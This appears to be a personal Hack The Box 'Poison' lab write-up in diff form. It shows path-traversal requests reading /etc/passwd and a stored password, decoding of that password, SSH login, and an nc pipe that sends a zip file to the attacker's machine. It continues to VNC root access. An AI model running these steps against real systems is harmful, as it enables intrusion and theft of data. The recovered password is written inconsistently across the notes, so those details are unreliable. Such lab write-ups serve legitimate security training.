@@ -1,0 +1,173 @@
+Temporary website to test local .php scripts.
+Sites to be tested: ini.php, info.php, listfiles.php, phpinfo.php
+Scriptname: 
+
+
+
+
+Contains within the listfiles.php
+Array ( [0] => . [1] => .. [2] => browse.php [3] => index.php [4] => info.php [5] => ini.php [6] => listfiles.php [7] => phpinfo.php [8] => pwdbackup.txt ) 
+
+
+Reading using listfiles
+http://10.10.10.84/browse.php?file=pwdbackup.txt
+This password is secure, it's encoded atleast 13 times.. what could go wrong really.. Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0 NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO Ukd4RVdub3dPVU5uUFQwSwo= 
+
+
+┌──(kali㉿kali)-[~]
+└─$ cp encoded.txt decoded0.txt
+for i in {1..13}; do
+    base64 -d decoded$((i-1)).txt > decoded${i}.txt
+done
+cat decoded13.txt
+Charix!2#4%6&8(0                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ 
+
+double check
+
+┌──(kali㉿kali)-[~]
+└─$ cat decode13.py 
+import base64
+s = '''Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU
+bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS
+bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW
+M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs
+WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy
+eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G
+WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw
+MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa
+T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k
+WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk
+WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0
+NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT
+Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz
+WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW
+VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO
+Ukd4RVdub3dPVU5uUFQwSwo='''.replace('\n','').replace(' ','')
+for i in range(13):
+    s = base64.b64decode(s)
+print(s)
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ python3 decode13.py
+b'Charix!2#4%6&8(0'
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ 
+
+
+
+http://10.10.10.84/browse.php?file=../../../../../../../etc/passwd
+
+
+(cleaned up)
+root:*:0:0:Charlie &:/root:/bin/csh
+toor:*:0:0:Bourne-again Superuser:/root:/bin/csh
+charix:*:1001:1001:charix:/home/charix:/bin/csh
+
+
+
+┌──(kali㉿kali)-[~]
+└─$ ssh charix@10.10.10.84
+(charix@10.10.10.84) Password for charix@Poison:
+Last login: Mon Mar 19 16:38:00 2018 from 10.10.14.4
+
+FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017
+
+Welcome to FreeBSD!
+
+Release Notes, Errata: https://www.FreeBSD.org/releases/
+Security Advisories:   https://www.FreeBSD.org/security/
+FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
+FreeBSD FAQ:           https://www.FreeBSD.org/faq/
+Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
+FreeBSD Forums:        https://forums.FreeBSD.org/
+
+Documents installed with the system are in the /usr/local/share/doc/freebsd/
+directory, or can be installed later with:  pkg install en-freebsd-doc
+For other languages, replace "en" with a language code like de or fr.
+
+Show the version of FreeBSD installed:  freebsd-version ; uname -a
+Please include that output and any error messages when posting questions.
+Introduction to manual pages:  man man
+FreeBSD directory layout:      man hier
+
+Edit /etc/motd to change this login announcement.
+Need to print a manpage? Use
+
+        man name_of_manpage | col -bx | lpr
+                -- Dru <genesis@istar.ca>
+charix@Poison:~ % whoami
+charix
+charix@Poison:~ %
+
+# Poison HTB - Full Walkthrough Command Reference (OSCP Style)
+
+# 1. Nmap scan
+nmap -sC -sV -oA nmap 10.10.10.84
+
+# 2. Web enumeration & LFI
+curl http://10.10.10.84/listfiles.php
+curl "http://10.10.10.84/browse.php?file=../../../../../../../etc/passwd"
+curl "http://10.10.10.84/browse.php?file=pwdbackup.txt"
+
+# 3. Decode multi-layer base64 password
+cp encoded.txt decoded0.txt
+for i in {1..13}; do base64 -d decoded$((i-1)).txt > decoded${i}.txt; done
+cat decoded13.txt
+# Or with Python:
+cat decode13.py
+import base64
+s = '''<base64_string>'''.replace('\n','').replace(' ','')
+for i in range(13):
+    s = base64.b64decode(s)
+print(s)
+# Decoded password: Charix!2#4%6&8(0)
+
+# 4. SSH as charix
+ssh charix@10.10.10.84
+# Password: Charix!2#4%6&8(0)
+
+# 5. Enumerate files as charix
+ls -la
+cat user.txt
+
+# 6. Transfer secret.zip (if needed)
+scp charix@10.10.10.84:/root/secret.zip ./
+# If permission denied, use base64 encoding to transfer:
+base64 /root/secret.zip > /tmp/secret.b64
+cat /tmp/secret.b64 | nc <your_ip> <port>
+# On Kali:
+nc -lvp <port> > secret.b64
+base64 -d secret.b64 > secret.zip
+
+# 7. Extract secret.zip
+unzip secret.zip
+# Password: Charix!2#4%6&8(0)
+
+# 8. Analyze secret file
+file secret
+strings secret
+# Usually contains VNC password
+
+# 9. Check VNC/X11 processes and sockets
+ps aux | grep vnc
+sockstat -4 -l | grep 5901
+
+# 10. SSH port forwarding for VNC
+ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84
+
+# 11. Connect to VNC from Kali
+vncviewer 127.0.0.1:5901 -passwd secret
+# Use password from secret file or decoded password
+
+# 12. Get root flag
+cat /root/root.txt
+# Example flag: 716d04b188419cf2bb9d891272361f5
+
+
+# End of Poison HTB Reference
+
+
+
